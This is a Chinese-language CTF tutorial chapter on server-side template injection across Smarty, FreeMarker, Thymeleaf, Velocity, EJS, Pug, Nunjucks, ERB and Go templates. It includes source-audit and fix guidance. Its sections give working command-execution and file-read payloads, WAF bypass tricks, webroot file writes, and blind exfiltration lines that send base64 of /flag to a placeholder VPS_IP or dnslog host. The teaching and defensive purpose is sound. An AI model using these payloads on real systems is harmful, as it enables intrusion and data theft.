
```php
$smarty->display("string:" . $_GET["name"]);
```

或者：

```php
echo $smarty->fetch("string:" . $_POST["template"]);
```

这里的用户输入会被当成 Smarty 模板源码解析。

安全写法应使用固定模板文件，并把用户输入作为变量传入：

```php
$smarty->assign("name", $_GET["name"]);
$smarty->display("index.tpl");
```

## 1.8 Java 模板注入

Java Web 中常见 FreeMarker、Thymeleaf 和 Velocity。Java 模板利用通常强烈依赖框架版本、安全配置、表达式上下文和可访问类。

### 1.8.1 FreeMarker 基础判断

FreeMarker 常用：

```freemarker
${7*7}
```

返回：

```text
49
```

其他测试：

```freemarker
${"ssti"?upper_case}
<#assign x=7*7>${x}
```

错误信息常包含：

```text
freemarker.core
freemarker.template.TemplateException
```

### 1.8.2 FreeMarker Execute 利用

经典 payload：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

一行写法：

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
```

原理：

1. `?new()` 尝试实例化指定 Java 类。
2. `freemarker.template.utility.Execute` 可以执行系统命令。
3. `ex("id")` 调用命令并返回输出。

现代 FreeMarker 或安全配置可能通过 `TemplateClassResolver` 禁止实例化危险类。

如果报错类似：

```text
Instantiating freemarker.template.utility.Execute is not allowed
```

说明 `?new` 或该类已经被限制。

### 1.8.3 FreeMarker 上下文读取

可以尝试枚举已暴露变量：

```freemarker
<#list .data_model?keys as key>
${key}
</#list>
```

读取具体变量：

```freemarker
${user}
${request}
${session}
```

具体对象名由应用传入的数据模型决定。

### 1.8.4 Thymeleaf 和 SpEL

Thymeleaf 常用于 Spring Boot。表达式可能使用 Spring Expression Language（SpEL）。

普通表达式：

```thymeleaf
${7*7}
```

如果用户输入只是变量值，`${7*7}` 不会自动被第二次执行。常见漏洞场景是：

- 用户控制模板名。
- 用户控制视图名的一部分。
- 用户内容被拼进模板源码。
- 使用 Thymeleaf 预处理表达式 `__${...}__`。

常见预处理测试：

```thymeleaf
__${7*7}__::.x
```

`::.x` 常用于让 Spring 把前面的内容当作 Thymeleaf 视图片段表达式处理。具体是否需要它取决于路由和返回视图名的方式。

### 1.8.5 Thymeleaf 读取文件

在允许类型引用 `T(...)` 和对象创建的 SpEL 环境中，可以尝试：

```thymeleaf
__${new java.lang.String(
T(java.nio.file.Files).readAllBytes(
T(java.nio.file.Paths).get("/flag")
)
)}__::.x
```

一行写法：

```thymeleaf
__${new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag")))}__::.x
```

这条链直接使用 Java NIO 读取文件，不依赖系统中存在 `cat`。

### 1.8.6 Thymeleaf 命令执行

执行命令：

```thymeleaf
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

上面通常只返回一个 `Process` 对象，不会自动显示命令输出。

读取标准输出：

```thymeleaf
__${new java.util.Scanner(
T(java.lang.Runtime).getRuntime().exec("id").getInputStream()
).useDelimiter("\\A").next()}__::.x
```

一行写法：

```thymeleaf
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__::.x
```

新版本 Spring / Thymeleaf 可能限制：

- `T(...)` 类型访问。
- `java.lang.Runtime`。
- `new` 对象创建。
- 预处理表达式。
- 危险方法调用。

因此这些 payload 不是所有 Thymeleaf 环境都能使用。

### 1.8.7 Velocity 基础判断

Velocity 常用 `$变量` 和 `#指令`。

数学测试：

```velocity
#set($x=7*7)$x
```

正常情况下可能输出：

```text
49
```

枚举常见对象：

```velocity
$request
$response
$session
$application
$class
```

### 1.8.8 Velocity 利用依赖上下文工具

网上常见通过 `$class`、`ClassTool` 或反射访问 Java 类，但 `$class` 并不是所有 Velocity 环境默认提供的变量。

如果上下文中存在 ClassTool，可能出现类似调用：

```velocity
$class.inspect("java.lang.Runtime").type
```

再进一步访问 `Runtime.getRuntime().exec()`。

如果 `$class` 原样输出或为空，说明该对象没有被加入模板上下文，不能直接使用这条链。

Velocity 利用的重点是先枚举上下文对象和工具，而不是照抄一条固定的 Java 反射 payload。

### 1.8.9 Java 模板常见注意点

1. 先根据报错区分 FreeMarker、Thymeleaf 和 Velocity。
2. Java 版本和框架补丁会显著影响可用链。
3. 命令执行返回的 `Process` 不等于已经拿到输出。
4. 精简容器可能没有 Shell 工具，优先尝试 Java API 直接读文件。
5. 类型访问、反射和类实例化经常被安全策略限制。
6. 上下文里暴露的业务对象可能比通用 RCE 链更有价值。

## 1.9 Node.js 模板注入

Node.js 常见 EJS、Pug、Nunjucks、Handlebars 等模板引擎。

Node.js 模板注入能否 RCE，取决于用户是否控制模板源码，以及模板执行环境中是否能访问 `process`、`require`、全局对象或危险辅助函数。

### 1.9.1 EJS 基础判断

EJS 常见标签：

| 标签 | 作用 |
| ---- | ---- |
| `<%= ... %>` | 执行表达式并 HTML 转义输出 |
| `<%- ... %>` | 执行表达式并原样输出 |
| `<% ... %>` | 执行 JavaScript，不直接输出 |

数学测试：

```ejs
<%= 7*7 %>
```

返回：

```text
49
```

字符串测试：

```ejs
<%= "ssti".toUpperCase() %>
```

### 1.9.2 EJS 读取文件

如果 `require` 在模板作用域中：

```ejs
<%= require("fs").readFileSync("/flag", "utf8") %>
```

部分 CommonJS 环境中可以通过：

```ejs
<%= global.process.mainModule.require("fs").readFileSync("/flag", "utf8") %>
```

较新的 Node.js 环境如果提供 `process.getBuiltinModule()`，可以尝试：

```ejs
<%= process.getBuiltinModule("fs").readFileSync("/flag", "utf8") %>
```

`process.mainModule` 在部分新版本或 ESM 环境中可能为空，因此要根据 Node.js 运行方式选择入口。

### 1.9.3 EJS 命令执行

直接使用 `require`：

```ejs
<%= require("child_process").execSync("id").toString() %>
```

通过 `process.mainModule`：

```ejs
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
```

通过 `process.getBuiltinModule()`：

```ejs
<%= process.getBuiltinModule("child_process").execSync("id").toString() %>
```

读取 flag：

```ejs
<%= global.process.mainModule.require("child_process").execSync("cat /flag").toString() %>
```

如果 `process`、`global` 和 `require` 都不可访问，应先枚举模板 locals，而不是假设通用链一定存在。

### 1.9.4 EJS 危险源码

危险：

```javascript
const ejs = require("ejs");

app.get("/", (req, res) => {
    const output = ejs.render(req.query.template, {
        user: req.user
    });
    res.send(output);
});
```

安全：

```javascript
app.get("/", (req, res) => {
    res.render("index.ejs", {
        name: req.query.name
    });
});
```

安全写法使用固定模板文件，把用户输入作为数据传入。

### 1.9.5 Pug SSTI

Pug 使用缩进表示 HTML 结构，插值表达式常写成：

```pug
p Hello #{name}
```

如果用户能够控制模板源码，数学测试：

```pug
#{7*7}
```

命令执行：

```pug
#{global.process.mainModule.require("child_process").execSync("id").toString()}
```

读取文件：

```pug
#{global.process.mainModule.require("fs").readFileSync("/flag","utf8")}
```

危险源码：

```javascript
const pug = require("pug");
const html = pug.render(req.body.template);
```

如果只是：

```javascript
res.render("index.pug", { name: req.body.name });
```

用户输入通常只是变量值，不会自动作为 Pug 代码重新执行。

### 1.9.6 Nunjucks SSTI

Nunjucks 语法类似 Jinja2：

```nunjucks
{{7*7}}
{{"ssti"|upper}}
```

Nunjucks 运行在 JavaScript 环境中，因此不能直接照搬 Python 的 `__class__` 链。

部分环境中可以从模板全局函数的 `constructor` 到达 JavaScript `Function`：

```nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

前提是：

- `range` 等函数存在于模板全局对象中。
- 模板没有启用有效沙箱。
- `process.mainModule` 在当前 Node.js 环境可用。

这条链失败时，应枚举可用全局变量，并根据 Node.js 版本调整。

### 1.9.7 Handlebars 不一定能直接 RCE

Handlebars 也使用 `{{ ... }}`，但设计上更接近逻辑受限模板。

基础测试：

```handlebars
{{this}}
{{#each this}}{{@key}}={{this}}{{/each}}
```

Handlebars 默认不会像 Jinja2 那样执行任意表达式。进一步利用通常依赖：

- 应用注册了危险 Helper。
- Helper 内部使用 `eval`、`Function`、文件读取或命令执行。
- 原型链访问未正确限制。
- 特定旧版本漏洞。

不要把 `{{7*7}}` 不返回 `49` 直接理解为没有模板注入。可能只是模板语言不支持算术表达式。

## 1.10 ERB SSTI

ERB 是 Ruby 常见模板系统，Sinatra 和部分 Rails 场景会使用。

### 1.10.1 ERB 基础判断

数学测试：

```erb
<%= 7*7 %>
```

返回：

```text
49
```

Ruby 版本：

```erb
<%= RUBY_VERSION %>
```

### 1.10.2 ERB 读取文件

```erb
<%= File.read("/flag") %>
```

读取环境变量：

```erb
<%= ENV.to_h %>
```

读取当前目录：

```erb
<%= Dir.entries("/") %>
```

### 1.10.3 ERB 命令执行

使用反引号：

```erb
<%= `id` %>
```

上面代码块中的 `id` 两侧应为 Ruby 反引号，完整写法是：

```ruby
<%= %x(id) %>
```

为了避免 Markdown 和 Ruby 反引号混淆，实战中也可以使用 `%x()`。

使用 `IO.popen()`：

```erb
<%= IO.popen("id").read %>
```

读取 flag：

```erb
<%= IO.popen("cat /flag").read %>
```

### 1.10.4 ERB 危险源码

危险：

```ruby
template = ERB.new(params[:template])
template.result(binding)
```

用户输入直接成为 ERB 模板。

安全思路：

- 使用固定 `.erb` 文件。
- 将用户输入作为局部变量传入。
- 不使用用户可控字符串调用 `ERB.new()`。

### 1.10.5 ERB 上下文对象

ERB 使用 Ruby `binding` 提供变量和方法。

可以尝试：

```erb
<%= local_variables %>
<%= instance_variables %>
<%= self %>
<%= methods.sort %>
```

有时直接读取应用已经建立的数据库对象、配置对象，比执行系统命令更方便。

例如题目使用 Sequel ORM，且上下文限制了常见数据库变量名时，可以检查：

```erb
<%= Sequel::DATABASES %>
```

如果存在数据库连接：

```erb
<%= Sequel::DATABASES.first.tables %>
```

这类利用依赖目标应用已经加载对应 Ruby 库。

## 1.11 Go Template 注入

Go 标准库提供 `text/template` 和 `html/template`。

Go 模板和 Jinja2 虽然都使用 `{{ ... }}`，但能力模型不同。

### 1.11.1 Go Template 基础判断

Go 标准模板不支持直接写 `7*7`。

因此：

```go-template
{{7*7}}
```

通常会报语法错误，不能用它作为唯一判断。

可以测试内置函数：

```go-template
{{printf "%s" "ssti"}}
{{len "1234567"}}
{{printf "%T" .}}
```

常见输出：

```text
ssti
7
当前数据对象的类型
```

### 1.11.2 枚举当前数据对象

输出当前对象：

```go-template
{{.}}
```

详细格式：

```go-template
{{printf "%#v" .}}
```

如果当前对象是 map，可以尝试：

```go-template
{{range $k,$v := .}}
{{$k}}={{$v}}
{{end}}
```

如果当前对象是结构体，可以访问导出的字段和方法：

```go-template
{{.Username}}
{{.Config}}
{{.ReadFile "/flag"}}
```

最后一条只有在对象确实暴露 `ReadFile` 方法时才有效。

### 1.11.3 FuncMap 决定利用能力

Go 模板只能调用：

- 内置模板函数。
- 当前数据对象暴露的字段和方法。
- 程序通过 `template.FuncMap` 注册的函数。

危险源码：

```go
funcMap := template.FuncMap{
    "readFile": os.ReadFile,
    "run": func(cmd string) string {
        out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
        return string(out)
    },
}

t := template.Must(
    template.New("page").Funcs(funcMap).Parse(userInput),
)
```

对应模板：

```go-template
{{readFile "/flag"}}
{{run "id"}}
```

如果程序没有注册危险函数，也没有暴露危险方法，Go 模板注入可能只能泄露当前数据对象，无法直接 RCE。

### 1.11.4 html/template 和自动转义

`html/template` 会根据 HTML 上下文自动转义输出，但自动转义不等于阻止模板代码执行。

例如：

```go-template
{{printf "%s" "`<script>`alert(1)`</script>`"}}
```

脚本标签可能被转义，但 `printf` 仍然被服务端执行。

### 1.11.5 Pongo2 不是 Go 标准模板

Pongo2 是 Go 实现的 Django/Jinja 风格模板引擎，语法与 Go 标准模板不同。

看到：

```text
{% include "..." %}
{{7*7}}
```

并且后端是 Go 时，可能是 Pongo2，而不是 `text/template`。

Pongo2 的利用重点包括：

- 可控模板内容。
- `include` 文件加载。
- 模板路径目录穿越。
- 自定义过滤器和函数。

## 1.12 无回显和外带利用

有些 SSTI 会执行表达式，但页面不输出结果。例如：

- 模板表达式位于 HTML 注释中。
- 渲染结果被后端丢弃。
- 邮件或后台任务异步渲染。
- 错误被统一捕获。
- 命令执行成功但没有读取标准输出。

### 1.12.1 时间延迟判断

Jinja2：

```jinja2
{{cycler.__init__.__globals__.os.popen("sleep 5").read()}}
```

Mako：

```mako
${__import__("os").popen("sleep 5").read()}
```

EJS：

```ejs
<%= global.process.mainModule.require("child_process").execSync("sleep 5").toString() %>
```

时间判断要多次对比正常请求，避免把网络抖动误判为延时执行。

### 1.12.2 HTTP 外带

在自己的 VPS 上监听：

```bash
python3 -m http.server 8000
```

让目标访问：

```jinja2
{{cycler.__init__.__globals__.os.popen("curl http://VPS_IP:8000/ssti").read()}}
```

如果没有 `curl`，可以尝试 `wget`、Python 标准库或对应语言的 HTTP 客户端。

Jinja2 使用 Python 标准库：

```jinja2
{{cycler.__init__.__globals__.__builtins__["__import__"]("urllib.request").request.urlopen("http://VPS_IP:8000/ssti").read()}}
```

模块导入和属性结构可能受 Python 导入方式影响，命令行工具存在时通常更简单。

### 1.12.3 数据外带

先把文件内容编码，避免空格、换行和特殊字符破坏 URL：

```bash
base64 -w0 /flag
```

再发送：

```jinja2
{{cycler.__init__.__globals__.os.popen("curl 'http://VPS_IP:8000/?x='$(base64 -w0 /flag)").read()}}
```

VPS 日志中可能出现：

```text
GET /?x=ZmxhZ3tzc3RpX2V4YW1wbGV9Cg== HTTP/1.1
```

本地解码：

```bash
echo "ZmxhZ3tzc3RpX2V4YW1wbGV9Cg==" | base64 -d
```

### 1.12.4 DNS 外带

当 HTTP 出网被限制但 DNS 可用时，可以将少量十六进制数据放入子域名。

示意命令：

```bash
xxd -p /flag | tr -d '\n'
```

取较短的一段后查询：

```bash
nslookup 666c61677b73737469.dnslog.example
```

DNS 标签最长 63 个字符，完整域名长度也有限制。较长数据需要分块并带序号。

### 1.12.5 文件写入

如果命令执行有结果但响应不可见，可以把输出写入 Web 可访问目录：

```jinja2
{{cycler.__init__.__globals__.os.popen("id > /var/www/html/result.txt").read()}}
```

然后访问：

```text
http://target/result.txt
```

成立条件：

- 知道 Web 根目录。
- Web 进程有写权限。
- 写入文件能够被 HTTP 访问。

## 1.13 SSTI 源码审计

源码审计的核心是寻找：

> 用户输入是否成为模板源码或模板名称，并被模板引擎解析。

### 1.13.1 Python 危险写法

Flask / Jinja2：

```python
render_template_string(user_input)
render_template_string("Hello " + user_input)
Environment().from_string(user_input).render()
Template(user_input).render()
```

Mako：

```python
from mako.template import Template
Template(user_input).render()
```

Tornado：

```python
tornado.template.Template(user_input).generate()
```

### 1.13.2 PHP 危险写法

Twig：

```php
$template = $twig->createTemplate($_POST["template"]);
echo $template->render();
```

Smarty：

```php
$smarty->display("string:" . $_GET["name"]);
echo $smarty->fetch("string:" . $_POST["template"]);
```

### 1.13.3 Java 危险写法

FreeMarker：

```java
Template template = new Template(
    "user",
    new StringReader(userInput),
    configuration
);
template.process(dataModel, writer);
```

Thymeleaf：

```java
templateEngine.process(userControlledTemplate, context);
```

Spring MVC 中还要注意控制器返回用户可控视图名：

```java
return request.getParameter("view");
```

这可能造成模板注入、模板路径穿越或视图解析问题，具体取决于视图解析器。

### 1.13.4 Node.js 危险写法

```javascript
ejs.render(userInput, data)
pug.render(userInput, data)
nunjucks.renderString(userInput, data)
Handlebars.compile(userInput)(data)
```

Handlebars 即使不能直接执行任意 JavaScript，也可能泄露上下文或调用危险 Helper。

### 1.13.5 Ruby 和 Go 危险写法

Ruby ERB：

```ruby
ERB.new(user_input).result(binding)
```

Go：

```go
template.New("page").Parse(userInput)
```

如果后续调用 `Execute()`，用户输入就会被当成模板执行。

### 1.13.6 审计数据流

完整审计时依次确认：

1. 用户输入来自哪里。
2. 是否经过 URL 解码、JSON 解析或数据库存储。
3. 是否发生字符串拼接。
4. 拼接结果是否传入模板编译或解析函数。
5. 模板上下文中传入了哪些对象和函数。
6. 是否启用沙箱或安全策略。
7. Web 进程拥有哪些文件和系统权限。
8. 渲染结果最终返回到哪里。

## 1.14 SSTI 自动化探测

自动化工具适合批量测试和辅助识别模板引擎，但不能代替手工分析。

### 1.14.1 BurpSuite 测试

1. 抓取正常请求。
2. 发送到 Repeater。
3. 在参数中依次测试：

   ```text
   ssti{{7*7}}test
   ssti${7*7}test
   ssti<%= 7*7 %>test
   ssti#{7*7}test
   ```

4. 对比：

   - 响应正文。
   - 响应长度。
   - 状态码。
   - 响应时间。
   - 错误关键词。

5. 确认模板后，再切换到对应模板引擎的 payload。

### 1.14.2 Python 批量探测脚本

```python
import requests

target = "http://target/"
parameter = "name"

probes = {
    "Jinja2/Twig/Nunjucks/Tornado": "ssti{{7*7}}test",
    "Mako/FreeMarker/Thymeleaf": "ssti${7*7}test",
    "EJS/ERB": "ssti<%= 7*7 %>test",
    "Pug": "ssti#{7*7}test",
    "Go template": 'ssti{{printf "%s" "ssti"}}test',
    "Smarty": "ssti{$smarty.version}test",
    "Velocity": "ssti#set($x=7*7)$xtest",
}

for engine, payload in probes.items():
    try:
        response = requests.get(
            target,
            params={parameter: payload},
            timeout=10,
        )

        print("=" * 60)
        print("engine:", engine)
        print("payload:", payload)
        print("status:", response.status_code)
        print("length:", len(response.text))
        print("time:", response.elapsed.total_seconds())
        print("preview:", response.text[:300].replace("\n", " "))

    except requests.RequestException as error:
        print(engine, "request failed:", error)
```

脚本只负责发送探测并展示差异，不会自动证明漏洞存在。

重点搜索：

```text
ssti49test
jinja2
Twig\Error
freemarker
TemplateSyntaxError
```

### 1.14.3 已知工具的使用原则

SSTI 自动化工具通常会完成：

- 注入点探测。
- 模板引擎指纹。
- 常见上下文枚举。
- 已知 RCE 链测试。
- 部分 WAF 绕过。

使用时要注意：

1. 工具的 payload 可能只适用于旧版本模板引擎。
2. 工具可能发送命令执行测试，比赛时先确认不会破坏环境。
3. 登录状态、CSRF Token 和动态参数需要手动处理。
4. WAF 可能根据请求频率封禁，先用低并发。
5. 工具失败不代表不存在 SSTI。
6. 源码可见时，优先根据具体模板和上下文手工构造。

## 1.15 SSTI 常见 WAF 绕过思路

不同模板引擎的语法不同，但分析 WAF 的方法基本一致。

### 1.15.1 先确认过滤位置

过滤可能发生在：

1. 浏览器前端 JavaScript。
2. 反向代理或 WAF。
3. Web 框架参数解析前。
4. URL 解码后。
5. 模板编译前。
6. 模板渲染结果输出前。

判断方法：

- 前端不允许提交：使用 BurpSuite、curl 或 Python 直接发请求。
- 原始请求被拦截：尝试编码、请求方法和 Content-Type。
- 参数进入后被替换：观察回显中哪些字符消失。
- 模板报语法错误：说明请求大概率已经到达模板引擎。
- 表达式执行但输出被转义：说明是输出层处理，不一定影响 SSTI。

### 1.15.2 更换输入位置

如果某一个参数过滤严格，可以检查其他进入同一模板的输入：

- GET 参数。
- POST 表单。
- JSON 字段。
- Cookie。
- 请求头。
- URL 路径。
- 文件名。
- 数据库存储字段。

例如页面同时渲染昵称和 `User-Agent`，昵称有 WAF，但请求头没有相同过滤，就可能从请求头进入模板。

### 1.15.3 更换请求方法和 Content-Type

同一个后端可能对不同解析方式使用不同过滤逻辑。

表单：

```http
Content-Type: application/x-www-form-urlencoded

name={{7*7}}
```

JSON：

```http
Content-Type: application/json

{"name":"{{7*7}}"}
```

Multipart：

```http
Content-Type: multipart/form-data; boundary=...
```

还可以测试 GET、POST、PUT、PATCH。

改变 Content-Type 只有在后端支持对应解析方式时才有意义。

### 1.15.4 同名参数污染

某些 WAF 检查第一个参数，后端却取最后一个参数，或者反过来。

```text
?name=safe&name={{7*7}}
```

也可以测试：

```text
?name={{7*7}}&name=safe
```

是否有效取决于反向代理、Web 框架和业务代码处理同名参数的方式。

### 1.15.5 使用模板语言自身能力重组字符串

不同模板常见字符串拼接：

| 模板 | 示例 |
| ---- | ---- |
| Jinja2 | `"o" ~ "s"` |
| Twig | `"o" ~ "s"` |
| Python / Mako | `"o" + "s"` |
| JavaScript / EJS | `"child_" + "process"` |
| Ruby / ERB | `"c" + "at"` |
| FreeMarker | `"o" + "s"` |

例如 Node.js：

```ejs
<%= global.process.mainModule.require("child_"+"process").execSync("id").toString() %>
```

Jinja2：

```jinja2
{{cycler.__init__.__globals__["o"~"s"].popen("id").read()}}
```

### 1.15.6 使用对象属性的不同访问方式

常见互换：

```text
object.attribute
object["attribute"]
object|attr("attribute")
```

不同模板支持程度不同，`attr` 是 Jinja2 / Twig 风格过滤器，不要直接套到所有模板。

### 1.15.7 不依赖 Shell

如果过滤：

```text
system
exec
popen
cat
sh
bash
```

可以优先寻找语言原生文件 API：

| 语言 | 直接读文件示例 |
| ---- | -------------- |
| Python | `open("/flag").read()` |
| PHP | `file_get_contents("/flag")` |
| Java | `Files.readAllBytes(Paths.get("/flag"))` |
| Node.js | `fs.readFileSync("/flag","utf8")` |
| Ruby | `File.read("/flag")` |
| Go | 取决于模板上下文是否暴露 `os.ReadFile` 或自定义函数 |

直接读文件不需要 `cat`，在精简容器中通常更稳定。

### 1.15.8 编码绕过要考虑解码顺序

常见尝试：

- URL 编码。
- 二次 URL 编码。
- JSON Unicode 转义。
- 字符串十六进制转义。
- HTML 实体。

但要注意：

- URL 编码通常由 Web 框架解码。
- JSON `_` 是否还原为下划线，取决于 JSON 解析发生在 WAF 前还是后。
- HTML 实体通常由浏览器解析，服务端模板引擎不一定会把 `&#123;` 当成 `{`。
- 二次编码只适用于确实发生二次解码的环境。

### 1.15.9 长度限制

当输入长度很短时：

1. 优先读取已经暴露的短变量，例如 `config`。
2. 使用较短的全局对象入口，例如 Jinja2 的 `lipsum`。
3. 把长字符串放到其他参数、Cookie 或请求头。
4. 先修改服务器端对象状态，再由后续请求触发。
5. 使用文件写入、Session 或数据库存储分段内容。

Jinja2 例子，把路径放在另一个参数：

```text
?x={{lipsum.__globals__.os.popen(request.args.c).read()}}&c=cat%20/flag
```

### 1.15.10 黑名单绕过的原则

1. 先找出精确过滤字符和关键词。
2. 确认过滤是否区分大小写。
3. 确认是替换为空还是直接拦截。
4. 判断是否只替换一次。
5. 每次只改变一个位置。
6. 保留正常请求作为对照。
7. 优先使用模板上下文中的短链。
8. 不要为了绕过而使用不属于当前模板引擎的语法。

## 1.16 Flask + Jinja2 完整例题

下面使用一个最常见的 Flask SSTI 场景演示完整分析过程。

### 1.16.1 题目源码

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)
app.config["SECRET_KEY"] = "ctf_ssti_secret"

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    template = """
    <h1>Hello, %s</h1>
    """ % name
    return render_template_string(template)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

关键代码：

```python
template = "<h1>Hello, %s</h1>" % name
return render_template_string(template)
```

用户输入 `name` 先被拼进模板字符串，之后整个字符串被 Jinja2 解析。

### 1.16.2 确认正常功能

请求：

```text
/?name=admin
```

返回：

```html
<h1>Hello, admin</h1>
```

说明 `name` 会被页面回显。

### 1.16.3 测试表达式

请求：

```text
/?name={{7*7}}
```

建议通过 curl 发送：

```bash
curl -G "http://target:5000/" \
  --data-urlencode "name={{7*7}}"
```

返回：

```html
<h1>Hello, 49</h1>
```

说明存在模板表达式执行。

### 1.16.4 判断 Jinja2

请求：

```jinja2
{{7*"7"}}
```

返回：

```text
7777777
```

结合 Flask 特征，可以判断为 Jinja2。

### 1.16.5 读取配置

```jinja2
{{config}}
```

或者只读取密钥：

```jinja2
{{config["SECRET_KEY"]}}
```

返回：

```text
ctf_ssti_secret
```

此时已经获得 Flask Session 签名所需的重要密钥。

### 1.16.6 直接读取 flag

优先使用 Python 文件 API：

```jinja2
{{cycler.__init__.__globals__.__builtins__["open"]("/flag").read()}}
```

使用 Python 发送：

```python
import requests

target = "http://target:5000/"

payload = (
    '{{cycler.__init__.__globals__.__builtins__'
    '["open"]("/flag").read()}}'
)

response = requests.get(
    target,
    params={"name": payload},
    timeout=10,
)

print(response.text)
```

如果 `/flag` 不存在，按顺序尝试：

```text
/flag.txt
/app/flag
/app/flag.txt
当前目录下的 flag
/proc/self/environ
```

### 1.16.7 命令执行

直接读取文件失败时，再测试命令执行：

```jinja2
{{cycler.__init__.__globals__.os.popen("id").read()}}
```

查看目录：

```jinja2
{{cycler.__init__.__globals__.os.popen("pwd;ls -la;ls -la /").read()}}
```

读取 flag：

```jinja2
{{cycler.__init__.__globals__.os.popen("cat /flag").read()}}
```

### 1.16.8 如果短链不可用

先枚举：

```jinja2
{{().__class__.__base__.__subclasses__()}}
```

再通过类名寻找 `catch_warnings`：

```jinja2
{% for c in ().__class__.__base__.__subclasses__() %}
{% if c.__name__ == "catch_warnings" %}
{{c.__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}
{% endif %}
{% endfor %}
```

不要直接复制固定数字下标。

### 1.16.9 漏洞修复

错误写法：

```python
template = "<h1>Hello, %s</h1>" % name
return render_template_string(template)
```

安全写法：

```python
return render_template_string(
    "<h1>Hello, {{ name }}</h1>",
    name=name,
)
```

更推荐使用固定模板文件：

```python
return render_template("index.html", name=name)
```

`index.html`：

```jinja2
<h1>Hello, {{ name }}</h1>
```

关键是让用户输入始终作为数据，而不是模板源码。

## 1.17 SSTI 常见注意点

### 1.17.1 模板表达式可能被执行多次

如果应用先渲染用户内容，再把第一次结果放进另一个模板，可能发生二次渲染。

第一次输入：

```text
{{"{{7*7}}"}}
```

第一次渲染可能产生：

```text
{{7*7}}
```

第二次渲染才变成：

```text
49
```

分析时要确认数据经过了几次模板解析。

### 1.17.2 不要混用模板语法

常见错误：

- 在 Twig 中使用 Jinja2 的 Python 对象链。
- 在 Nunjucks 中使用 Python `__class__`。
- 在 Go template 中直接使用 `{{7*7}}`。
- 在现代 Twig 中照抄 Twig 1.x `_self.env`。
- 在 Django Template 中直接套 Jinja2 RCE。

先确定模板，再选择 payload。

### 1.17.3 自动转义不能防止 SSTI

自动转义只能把：

```html
`<script>`
```

转换成：

```html
&lt;script&gt;
```

它不会阻止：

```jinja2
{{7*7}}
```

被模板引擎计算。

### 1.17.4 命令执行成功不等于有回显

Java `Runtime.exec()` 返回 `Process`。

Node.js 异步 `exec()` 可能在页面返回后才执行。

Python `os.system()` 返回退出码，不返回命令输出。

需要根据语言选择：

| 语言 | 获取输出的常见方式 |
| ---- | ------------------ |
| Python | `os.popen(...).read()` |
| Node.js | `execSync(...).toString()` |
| Ruby | `IO.popen(...).read` |
| Java | 读取 `Process.getInputStream()` |
| PHP | `system()`、`passthru()` 或输出缓冲 |

### 1.17.5 精简容器可能没有常用命令

可能不存在：

```text
bash
curl
wget
nc
cat
```

遇到这种情况：

- 使用语言原生文件 API。
- 使用语言标准库发 HTTP 请求。
- 检查 `/bin/sh` 是否存在。
- 查看应用运行目录和环境变量。

### 1.17.6 模板沙箱和关键字过滤不是一回事

关键字过滤通常只是字符串检查，可以通过拼接、编码、属性访问替换等方式绕过。

模板沙箱会在模板运行时限制属性、函数、类和方法。遇到明确的 Sandbox 安全异常时，应分析安全策略和上下文对象，而不是只改大小写。

### 1.17.7 先读文件再考虑反弹 Shell

CTF 的目标通常是 flag。

推荐顺序：

```text
读取 config
读取环境变量
读取 /flag
读取应用源码
最后才考虑反弹 Shell
```

反弹 Shell 还会受到出网、Shell、工具、端口和权限限制。

### 1.17.8 注意模板版本

同一个模板引擎不同版本可能：

- 移除危险函数。
- 改变属性访问规则。
- 默认启用更严格的沙箱。
- 禁止字符串 callable。
- 改变错误信息。
- 修复已知逃逸链。

记录目标版本后再选择利用链。

### 1.17.9 注意 URL 和引号编码

推荐使用：

```bash
curl -G "http://target/" \
  --data-urlencode 'name={{7*7}}'
```

或者 Python `requests` 的 `params` / `data` / `json` 参数，让库负责正确编码。

不要手工复制超长 URL 后遗漏：

- `+` 被解析为空格。
- `#` 被浏览器当成 URL Fragment，不发送给服务器。
- `&` 被拆成下一个参数。
- 引号被 Shell 提前解释。

### 1.17.10 固定 subclasses 下标不可复用

题目 A 中：

```text
__subclasses__()[276]
```

可能是 `Popen`。

题目 B 中同一个下标可能是完全不同的类。

必须在目标环境重新枚举。
